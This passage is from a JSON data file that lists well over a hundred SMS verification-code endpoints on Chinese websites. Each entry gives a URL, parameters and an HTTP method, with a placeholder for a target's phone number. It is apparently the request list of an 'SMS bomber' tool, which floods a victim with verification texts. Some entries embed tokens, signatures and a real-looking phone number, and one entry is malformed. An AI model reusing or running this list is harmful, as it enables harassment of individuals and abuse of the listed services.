        "url": "http:\/\/my.cnki.net\/elibregister\/Server.aspx?mobile=手机号码&temp=1551691791466&operatetype=2",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.ebuick.com.cn\/buick\/user\/public\/sendMobileVcode.html",
        "parm": "mobile=手机号码&checkRegister=2",
        "type": "POST"
    }, {
        "url": "https:\/\/sso.scrcu.com\/ebuisso\/SendSMSVerificationCode?userId=0000&authType=03&mobile=手机号码&checkCodeFlag=&host=203.62.131.0&behavCode=TRAN_USER_0001&_=1551777254683",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/msxapi.msx66.com\/openapi\/customerInfoService\/sendSMSCode",
        "parm": "{\"accessToken\":\"784d5561ebe79c34f90b4d593df56516\",\"datas\":{\"request\":{\"mobile\":\"手机号码\",\"optType\":\"0003\",\"productType\":\"CREDIT\"}}}",
        "type": "POST"
    }, {
        "url": "http:\/\/nbjdbx.zyzdfos.com\/mobile\/send\/sms\/promotion",
        "parm": "mobile=手机号码&timestamp=1551779744000&appName=jbrj_sld&sign=91a386cc99d40bcea1a48388e80308f3",
        "type": "POST"
    }, {
        "url": "http:\/\/api.zhongyoubaoyao.com\/sms\/getRegisterSmsCode",
        "parm": "userPhone=手机号码&typeFrom=web",
        "type": "POST"
    }, {
        "url": "http:\/\/www.smallroo.com\/index\/index\/send.shtml",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/intrepaypro.handmart.cn\/hpayDFPaySupport\/system\/authSmsCode",
        "parm": "mobile=手机号码&channelCode=WIK",
        "type": "POST"
    }, {
        "url": "https:\/\/www.7177.cn\/plugin.php?id=zhanmishu_sms:send&no_submit=no_submit&method=send",
        "parm": "regsubmit=yes&formhash=66263fb5&referer=https%3A%2F%2Fwww.7177.cn%2Fxinkouzi%2F&activationauth=&gz0Dli=&whKzgQ=&ISwWMq=&mobile=手机号码&code=478250&sms_verify=&seccodehash=cSA6h6k7&seccodemodid=member%3A%3Aregister&seccodeverify=&nationcode=86",
        "type": "POST"
    }, {
        "url": "http:\/\/mdqb.fastonloan.com\/front\/user\/sendCodeForS",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/edf.jimiao123.com\/svr\/txCtrl?txcode=sms001",
        "parm": "{\"tokenKey\":\"1551799235165-b777416bc17ef\",\"account_id\":\"手机号码\",\"is_check_account\":1}",
        "type": "POST"
    }, {
        "url": "https:\/\/wap.jiehuahua.com\/mw\/smsCaptha.html",
        "parm": "mobile=手机号码&uk=5c7e951fb3a0d",
        "type": "POST"
    }, {
        "url": "https:\/\/m.wecash.net\/platform\/sms\/sendSMSCode",
        "parm": "tel=手机号码&markVersion=test&sourceFlag=8&appVersion=4.1&deviceId=手机号码&sourceMark=weixin&sourceType=weixin&isNew=no&sign=86c1ef3ffa235ec789b0de458ee33086",
        "type": "POST"
    }, {
        "url": "https:\/\/m.beneucard.com\/hfas\/sapi\/sms\/gen-sms",
        "parm": "{\"mobile\":\"手机号码\",\"sms-type\":\"SIGN_UP\"}",
        "type": "POST"
    }, {
        "url": "https:\/\/channel.n-orange.com\/loan-web\/api\/wxh5\/user\/v2.0\/sendRegisterSMSNotice",
        "parm": "phone=手机号码&captchaCode=&deviceType=weixin&applicationSourceNo=0.9.0.0&latitude=23.12463&longitude=113.36199&bizChannel=1110",
        "type": "POST"
    }, {
        "url": "https:\/\/mimiguan.mimidai.com\/mimidai-api\/user\/registCode?phone=手机号码&token=fcc1cbd3cb3e49549d4ead62b8694d3b&mimidaiVersion=1&mimidianVersion=1",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/jiahui.chachazx.com\/tp5\/public\/index.php\/Index\/logins\/caonima_API",
        "parm": "phone=手机号码&code_info=9182",
        "type": "POST"
    }, {
        "url": "https:\/\/m.rongxiaoliu.cn\/api\/auth\/send-login-sms",
        "parm": "base_front=1&base_app_id=1&base_version=1.0.00&base_registration_id=&base_udid=7050aedfaf134829a7e01fdd1707825a&base_system_name=2&base_access_token=&base_session_id=7050aedfaf134829a7e01fdd1707825a&base_channel_id=95&task_id=&user_id=0&user_level=0&mobile=手机号码&geetest_challenge=&geetest_validate=&geetest_seccode=",
        "type": "POST"
    }, {
        "url": "base_front=1&base_app_id=1&base_version=1.0.00&base_registration_id=&base_udid=7050aedfaf134829a7e01fdd1707825a&base_system_name=2&base_access_token=&base_session_id=7050aedfaf134829a7e01fdd1707825a&base_channel_id=95&task_id=&user_id=0&user_level=0&mobile=手机号码&geetest_challenge=&geetest_validate=&geetest_seccode=",
        "parm": "{\"protocol\":{\"fromPlatform\":\"venus\",\"functionCode\":\"ins_sendTktByMobile_send_dynamic_code\"},\"param\":{\"media\":\"index\",\"campaignId\":\"2018121800256261\",\"channel\":\"jinrirong\",\"inviteCode\":null,\"name\":\"\",\"idCard\":\"\",\"mobile\":\"手机号码\",\"verifyCode\":\"\"}}",
        "type": "POST"
    }, {
        "url": "https:\/\/jkd.2345jr.com\/gateway\/kdw\/getDynamicCode",
        "parm": "uuid=&imageCode=&mobilephone=手机号码&dynamicCodeType=1",
        "type": "POST"
    }, {
        "url": "http:\/\/m.jinxianghui.net\/page\/send",
        "parm": "_crsf=iTmfxurKJzp88EADIXqAcHnPuOifjnVGZVf-b1zDa7PkfOaRj6wRbjCZA1cQKNJATaX7ufa7PQASPccpCbcE4w%3D%3D&phone=13022038153&uuid=0685903e-7946-4d89-99da-07431da2a40a&source=201",
        "type": "POST"
    }, {
        "url": "https:\/\/wx.9fchaoneng.cn\/sys\/sms\/sendMobileCode?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/api.susuhua.com\/register\/getSmsVerifyCode\/手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/m.jiedianqian.com\/api\/account\/send_verify_code.do?mobile=手机号码&codeLength=4&deviceType=H5&timestamp=Fri%20Mar%2008%202019%2016:23:18%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)&sign=6f084f487cca3570122fe7e4d9d47904&channel=dkdsalscpa76&isLoading=false&tokenID=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/m.saimiuer.com\/wap\/system\/sendsms",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/app.upenny.cn:444\/userproduct\/api\/4.0.0\/message\/sendAuthCode",
        "parm": "addProduct=xsyd&addChannel=h5&devicePlatform=h5&productVersion=2.0.0&marketChannel=IDAI000010&loanProduct=xsyd&phone=手机号码&sendType=sms&type=registerCode",
        "type": "POST"
    }, {
        "url": "https:\/\/m.iqianzhan.com\/api\/v1\/user\/getSms",
        "parm": "{\"body\":{\"mobile\":\"手机号码\",\"identify\":\"\",\"captcha\":\"\",\"cType\":\"2\"},\"comm\":{\"pid\":\"f915611d-d724-46bb-8f56-05a85c4d816b\",\"pidType\":\"uuid\",\"businessType\":\"zy\",\"channelCode\":\"kaolayouqian2\",\"clientDateTime\":1552033755,\"trackerId\":\"0b363dc9-016d-4450-961b-540d3484da07\"}}",
        "type": "POST"
    }, {
        "url": "https:\/\/act.tiantianjiedao.com\/api\/v1\/channel\/h5SendDynamic",
        "parm": "{\"mobile\":\"手机号码\",\"param\":\"key1552033953727\"}",
        "type": "POST"
    }, {
        "url": "https:\/\/ssl.aomygod.com\/passport\/smsSendByMobile?callback=jQuery1111036171574131878836_1552280653640&mobile=手机号码&sign=MXdG1rfA4YDT4zQB9UWjjKH2QATGGwQyfPDfurwSRYzBLcydrjJQxGnnxv2OwY1t1B*73NwF30IhICzKkaMqtjb61frl6uPdKIr9U2AJkm1FX%2BW0841QtHXv0sgaelcg3xxDFLAxEoBCgeEjdR-RZg%2Bgb%2FqXurQnkavfhUeAgFQ%3D&_=1552280653641",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.bags163.com\/plugin.php?id=wq_smslogin&mod=sendcode",
        "parm": "module=register&formhash=456758ec&phone=手机号码&loginsubmit=yes&inajax=1&handlekey=register",
        "type": "POST"
    }, {
        "url": "https:\/\/new.warmcome.com\/UserCenter\/GetValidateCode",
        "parm": "phone=手机号码&ctype=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.dangaoss.com\/h5\/acc\/send_code?_t=1552475308&sign=424064b2d2d003d83db05380438824cb&username=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/m.120ask.com\/member\/uregcode\/?mobile=手机号码&signkey=20c577b0caa45d061adab00fc22ec8f9&rand=155247557975559",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/wx01.lecake.com\/customer\/get-code.html?mobile=手机号码&yzm=148323267",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/ls.zhonglunnet.com\/entry\/reg\/sendYzm.action",
        "parm": "account=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/kf.miaomaiyun.com\/regx\/sms_captchav4?timestamp=7USyh1fT&sign=4bcd79d90a654d0bf17a359ac66c2684&mobile=手机号码",
        "parm": "mobile=手机号码&zyyi_c=29390f70c2811b2e0170ed101e0e8e5d",
        "type": "POST"
    }, {
        "url": "http:\/\/micservice.91qinqu.com\/huieryun-identity\/api\/v1\/authgateway\/91qq\/sendsms",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/561",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/564",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/565",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/566",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/567",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/bd.hwyds0002.com\/Ajax\/newusersqcode.aspx",
        "parm": "mob=手机号码&code=&kssqPhoneNumber=手机号码&comefrom=350&cityid=&dkje=500",
        "type": "POST"
    }, {
        "url": "http:\/\/www.wodsy.com\/backend\/smscode?phone=手机号码",
        "parm": "",
        "type": "POST"
    }, {
        "url": "http:\/\/www.jinglingbox.com\/a\/usr\/user\/senderUserBus?mobile=手机号码&roy=978585",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/562",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/563",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.laio.cn\/verifycode.html",
        "parm": "ajax=true&type=register&mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.xingxiangjx.xc.laio.cn\/verifycode.html",
        "parm": "ajax=true&type=register&mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.tansent.com\/ajax_utf\/?w=regscd&mb=手机号码&rem=m&rty=p&_=1550390199830",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/xljbirthdayapi.zmdtech.cn\/API\/Client\/SendCode",
        "parm": "{  \"WxOpenId\" : \"oWqhKuCO0UppzWhLVCnRuGkgZ8qU\",  \"Mobile\" : \"手机号码\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yuu1.com\/flhome\/login\/sendVerifyCode\/",
        "parm": "username=手机号码&type=0",
        "type": "POST"
    }, {
        "url": "http:\/\/www.201046.com\/member\/register.php",
        "parm": "action=ca32e0d6e19eed402e987b8b4553fdd3&value=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/m.dhc.net.cn\/cust\/regauth.jsp?phone=手机号码&s=23e8ffa9b61247e44f5c5bcae5039857",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/passport.zhulong.com\/user\/sendyzm",
        "parm": "phone=%2B86手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.ctoutiao.com\/ajax_new\/ajax_action.php?action=noPassvalidmobile&tt=1550377536498",
        "parm": "mobile=手机号码&reg=1&fh=&sm_token=1550377536498",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yifatong.com\/Customers\/gettcode?rnd=1550389874.197&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/passport2.chaoxing.com\/num\/phonecode?phone=手机号码&needcode=false",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.kapool.cn\/reg!sendValidcodeAjax.do",
        "parm": "username=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.gz-arts.com\/common\/webGZWHG\/sendSmsCode_Super",
        "parm": "mobilePhone=手机号码&isFindpwd=false&account=&mode=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.whqy.cn\/login\/vcodes",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/wrpx.wenhuayun.cn\/wrpxFrontUser\/sendSmsCode.do",
        "parm": "phoneNo=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/fzccs.chaoxing.com\/ppregister\/interfaces\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.whpd.sh.cn\/why\/frontTerminalUser\/sendSmsCode.do?asm=1550313715703",
        "parm": "userMobileNo=手机号码&userName=1231231&userPwd=qq123123123&userSex=1",
        "type": "POST"
    }, {
        "url": "https:\/\/pass.hujiang.com\/v2\/Handler\/UCenter?action=SendMsg&imgcode=&token=1e7bbab658a5b65cbc3074d6296a0b9b&sendtype=register&msgtype=1&captchaVersion=2&user_domain=hj&business_domain=&hpuid=P0S4wETf4noqmS29L5650&callback=reqwest_1546707722757024049&mobile=%2B86-手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/passport.fanhuan.com\/login\/asklogincode?callback=jQuery18307125578716707999_1546707858677&_=1546707872507&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/exmail.qq.com\/cgi-bin\/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/act.dnurse.com\/wechat\/send_code",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yaokangshu.com\/ajax\/sms",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/wechat.wboll.com\/shop\/getphonecode",
        "parm": "mobile=手机号码&wid=100165",
        "type": "POST"
    }, {
        "url": "http:\/\/www.xkb365.com\/index.php?app=w3g&mod=Passport&act=getVerify",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/mobile.cmbchina.com\/DUserManage\/UserRegisterNew\/URN_Register.aspx?phoneNo=手机号码&showtopbar=true&DeviceType=E&Version=7.1.2&SystemVersion=6.0.1&behavior_entryid=lgf005001",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.huitongpx.com\/user\/sendcode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.ph-fc.com\/index.php?g=Api&m=AjaxSms&a=smssend",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.china-drama.com\/api\/SMS.ashx?op=1&phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/18.schoolpal.cn\/api\/CommonBusiness\/SendMobileVerificationCode?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/login.51job.com\/ajax\/sendphonecode.php?jsoncallback=jQuery18307610929541763114_1547125502231&nation=CN&type=5&from_domain=i&verifycode=&_=1547125703761&phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/login-user.kugou.com\/v1\/send_sms_for_reg?appid=1014&callback=GetSmsCodeCallbackFn&v=1&verifycode=&ct=1546670699&type=reg&mid=07546126fef194aa4b29a5a80ec7a8d1&kguser_jv=180925&mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/hdgateway.zto.com\/auth_account_sendRegisterSmsVerifyCode?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/m.jf.10010.com\/wx006\/jf-auth\/wx\/getCaptcha\/手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.nidance.com\/Home\/getVerifyCode",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.xreader-book.com:8088\/ZWsWeb\/x\/phoneVerificationCode?_token=&nonceStr=1548577394770&_t=&_v_u=6451521A1555DDBF&_label=z-3660-00047&phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/zyzx.dgg.net\/api\/get_sms_code2do?callback=flightHandler&tel=手机号码&_=1547104197075",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/wx.cq3g.cn\/shop\/sendSmsCode?phone=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/webapi.91xuexibao.com\/user\/api\/verifycode",
        "parm": "mobile=手机号码&type=1&cookie=&user_agent=%7B%22app_name%22%3A%22xxb%22%2C%22app_ver%22%3A%225.7.1%22%2C%22dev_model%22%3A%22SLA-AL00%22%2C%22sys_name%22%3A%22android_os%22%2C%22sys_ver%22%3A%227.0%22%2C%22version%22%3A%221%22%7D&token=&version=v3.3.5&bid=c",
        "type": "POST"
    }, {
        "url": "http:\/\/app1.weiapp.qq.com\/membercard\/sms\/getcode",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/gz.worldunionji.com\/user\/registerSms",
        "parm": "{\"sendNumber\":\"手机号码\"}",
        "type": "POST"
    }, {
        "url": "https:\/\/ksf.haogeqiu.com\/cj\/index.php?callback=jQuery21408228044142558733_1549989659301&phone=手机号码&channelId=1&s=%2Findex%2Fsend_code1812&_=1549989659302",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/account.fanteip.com\/Validcode\/SendLoginSMS",
        "parm": "mobile=手机号码&ischeck=0",
        "type": "POST"
    }, {
        "url": "http:\/\/www.teamax-cn.cn\/Mobile\/Users\/HandlerMember.ashx?type=sendSMSVerify",
        "parm": "BID=2F108BB4093D6446&Phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.kangliyixue.com\/user\/default\/newsms.html",
        "parm": "mobile=手机号码&type=weixin_register&captcha=&code=",
        "type": "POST"
    }, {
        "url": "https:\/\/mp.elong.com\/mobilepromotion\/common\/sendactivitysmscodemtools%20?activityId=9880be64-a7c2-476e-9879-2fe371910f45&mobile=手机号码&gCode=",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/m.bidizhaobiao.com\/contrl\/ac",
        "parm": "param=%7B%22phoneNumber%22%3A%22手机号码%22%2C%22channel%22%3A40%2C%22busiType%22%3A10%7D&url=%2FsecurityCode.do",
        "type": "POST"
    }, {
        "url": "http:\/\/weixin.gz7x24.cn\/App\/DIY\/Core\/Mini\/API.ashx?__path=\/DIY\/View\/Supplier\/View\/Register&__action=SEND_TEL_CODE",
        "parm": "tel=手机号码&action=",
        "type": "POST"
    }, {
        "url": "http:\/\/lapi.suning.com\/lapi\/weixin\/getCode.htm",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/feilin.fqrst.com\/Wx\/Bind\/get_smscode",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/dbrlafite.31huiyi.com\/index.php?r=public\/sendCode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.acadsoc.com.cn\/Ajax\/Web.UI.Fun.User.aspx",
        "parm": "phone=%22手机号码%22&verifyType=0&__=SMSCodeByVerifyImg",
        "type": "POST"
    }, {
        "url": "http:\/\/anju.rupassport.shenzhenzjj.com\/sendSms?service=http%3A%2F%2Fanju.m.shenzhenzjj.com%2Fcas%2Flogin%3Fredirect%3D%2Fuser",
        "parm": "phone=手机号码&code=",
        "type": "POST"
    }, {
        "url": "http:\/\/www.pl298.com\/sso\/common\/sendNoteVerifys.action",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.miamiazu.com\/messageServicePopularize\/registerUpadte\/send\/domainName",
        "parm": "cellPhone=手机号码&type=5&codeRuleType=00003",
        "type": "POST"
    }, {
        "url": "https:\/\/h5.youzan.com\/usercenter\/member\/member\/mobilesmscode.json",
        "parm": "kdt_id=19161003&mobile=手机号码&verify_times=1",
        "type": "POST"
    }, {
        "url": "https:\/\/mall.api.epet.com\/v3\/user\/bdphone.html?do=sendCode",
        "parm": "phone=手机号码&type=&isWeb=1&system=wap&version=303",
        "type": "POST"
    }, {
        "url": "http:\/\/shop.sctobacco.com\/sendValidationCode.htm",
        "parm": "phoneNum=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/waters.guoshish.com\/api\/user\/register\/sms",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/weixin.sgwxdzs.com\/app\/index.php?i=2&c=entry&m=ewei_shopv2&do=mobile&r=account.verifycode",
        "parm": "mobile=手机号码&temp=sms_bind&imgcode=0",
        "type": "POST"
    }, {
        "url": "http:\/\/public.my24box.cn\/YiGuiBoxPush\/user\/sendCode.html",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/dental360.cn\/Vweb\/sendmobilecode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.zoyob.com\/m-WeiXin\/register\/SendMobileCode",
        "parm": "pluginId=Himall.Plugin.Message.SMS&destination=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/user.qunar.com\/webApi\/logincode.jsp",
        "parm": "mobile=手机号码&vcode=&origin=wechat$$$qunar&action=register&type=implicit",
        "type": "POST"
    }, {
        "url": "http:\/\/www.xiakefyz.com\/home\/light\/getphone",
        "parm": "appointmentNum=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/m.epwk.com\/land\/sendcode",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/jxcps.sinopec.com\/sms\/createSMS",
        "parm": "phone=手机号码&tempCode=wechat_zc",
        "type": "POST"
    }, {
        "url": "http:\/\/dgapi.dangao.com\/index.php\/Userreg\/getRegVerify",
        "parm": "jsonstr=%7B%22phone%22%3A%22手机号码%22%7D",
        "type": "POST"
    }, {
        "url": "http:\/\/i.quhuhu.com\/api\/passport\/getMobileCode.do?_=1539349214987",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.ygqiandai.com\/user\/inviterSmsCode",
        "parm": "phone=手机号码&tokenKey=201809301556123319475171&token=1e3edcfa-e246-414e-9440-a985854fd3e3&type=W01",
        "type": "POST"
    }, {
        "url": "http:\/\/120.78.226.5:8081\/ejtx\/sms",
        "parm": "phone=手机号码&smsType=1&productId=6AF0B80C05704D429C9B9A91EF398706",
        "type": "POST"
    }, {
        "url": "https:\/\/m.nxin.com\/user\/sendSms\/reg_with_phone",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/mshop.yolipai.net\/index.php?m=Home&c=Api&a=send_validate_code&t=0.7923910054378211",
        "parm": "stoid=185&s_time_out=60&type=mobile&send=手机号码&scene=1&openid=oISvQjoZvkOfcw7bqI_NMOxnxBD8&openidkey=2ade98e12ed4c8e6367eabb3235d2bdf",
        "type": "POST"
    }, {
        "url": "http:\/\/app.1chuanqi.com\/defaults\/send_msg",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/shequxfw.qingmh.com\/community-wechat\/login\/sendsms",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/saasw.shenzhoutongbao.cn\/Weixin\/reg!sendCode",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/newunion.huazhu.com\/Wechat\/getMobileAuthCode",
        "parm": "phoneNumber=手机号码&captchaType=WXLogin&sessionId=5a332cd2-9c44-42ff-89de-28a85d6bd812",
        "type": "POST"
    }, {
        "url": "https:\/\/api.smartstudy.com\/usert\/captcha\/phone",
        "parm": "type=authenticode&phone=手机号码&countryCode=86",
        "type": "POST"
    }, {
        "url": "https:\/\/id.ifeng.com\/api\/simplesendmsg",
        "parm": "mobile=手机号码&comefrom=7&auth=&msgtype=0",
        "type": "POST"
    }, {
        "url": "http:\/\/spush.net\/index.php?a=bind&m=phoneCode&api=1",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/nd.creditease.cn\/wxBindSendMobileCode.html",
        "parm": "mobile=手机号码&userOpenId=o4UuEuPXP7bMT6EpD8i5qgOFGEr0",
        "type": "POST"
    }, {
        "url": "http:\/\/njicebox.laonianwy.com\/user\/getCheckCode",
        "parm": "mobile=手机号码&token=&userId=&a=1&b=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.guanglikou.com\/verificationCodeForRegist.action",
        "parm": "telephone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.uumyhome.com\/getSms.json",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/gzh.sainact.com\/send.php",
        "parm": "username=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.opplestore.com\/ouser-web\/mobileRegister\/sendCaptchasForm.do",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.cloudtrust.com.cn\/register\/generatePhoneCaptcha",
        "parm": "{\"tel\":\"U2FsdGVkX19HRPvLj3SCRecuWNBD+3Dvlo+FH\/MqkiHyu1etdXq9qvPcdd7tcBkiFMJXVDDSYYQ57RX5jbt7eeaKA235UpOF\/X7C6QYmslQ=\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/passport.zhulong.com\/user\/sendyzm",
        "parm": "phone=%2B86手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/s.viomi.com.cn\/services\/vmall\/user\/sendAuthCode.json?mobile=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/api.udream.cn\/basics\/customer\/sendCaptchaMsg?ts=1548926592309&mobile=手机号码&messageType=0",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/card.kfc.com.cn\/O2OSales\/sendMessage",
        "parm": "mobile=手机号码&brandid=002",
        "type": "POST"
    }, {
        "url": "http:\/\/www.51guobei.com\/verification\/codeNew.do",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/micservice.91qinqu.com\/huieryun-identity\/api\/v1\/authgateway\/91qq\/sendsms",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.ucans.net\/rmp\/GetParentGetYZMServlet",
        "parm": "inputInfo=手机号码&fromType=mskt",
        "type": "POST"
    }, {
        "url": "http:\/\/www.fcgwhy.com\/web\/defaulted\/login\/sendSms",
        "parm": "userName=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.jsggwhy.com\/index.php?s=\/Home\/User\/send_short_msg.html",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/whjjy.org\/frontTerminalUser\/sendSmsCode.do?asm=1548146604769",
        "parm": "userMobileNo=手机号码&userName=sdsasd&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/szswhy.com\/Home-Login-getCode.do",
        "parm": "telephone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.whmas.ah.cn\/frontTerminalUser\/sendSmsCode.do?asm=1548146801678",
        "parm": "userMobileNo=手机号码&userName=sidhfi&userPwd=123456dd&userSex=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.clwhy.cn\/smscode.html",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.setvn.com\/plus\/ajax.php?myaction=getphoneyzm",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/jycultureclouds.lib.chaoxing.com\/ppregister\/手机号码\/sendvfcncode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/tongdao.wentiyun.cn\/smscode.html",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.bokc.one\/ajax\/sendCode",
        "parm": "token=&mobile=手机号码&zone=86",
        "type": "POST"
    }, {
        "url": "http:\/\/www.fsswhg.com\/ajaxRpcActionController\/jsonData",
        "parm": "bean=smsService&method=sendMsnBBCheck&params=%5B%22手机号码%22%2C11%5D",
        "type": "POST"
    }, {
        "url": "http:\/\/www.sxqunwen.com\/ajax",
        "parm": "action=mobilecode&mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.gdscc.cn\/api\/user\/sendSmsCode",
        "parm": "phone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.gz-arts.com\/common\/webGZWHG\/sendSmsCode",
        "parm": "mobilePhone=手机号码&isFindpwd=false&account=",
        "type": "POST"
    }, {
        "url": "https:\/\/cfmpay.cfbond.com\/login\/smscodesendz?phonenum=手机号码",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.haoduowang.com\/Tools\/UI\/Ajax.ashx?action=Get_YzMoble",
        "parm": "txtU_Mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.kujiale.com\/api\/useraccount\/sms\/switch\/sendsms",
        "parm": "tel=手机号码&type=6",
        "type": "POST"
    }, {
        "url": "https:\/\/www.yojiang.cn\/api\/user\/send_verify_code?phone=手机号码",
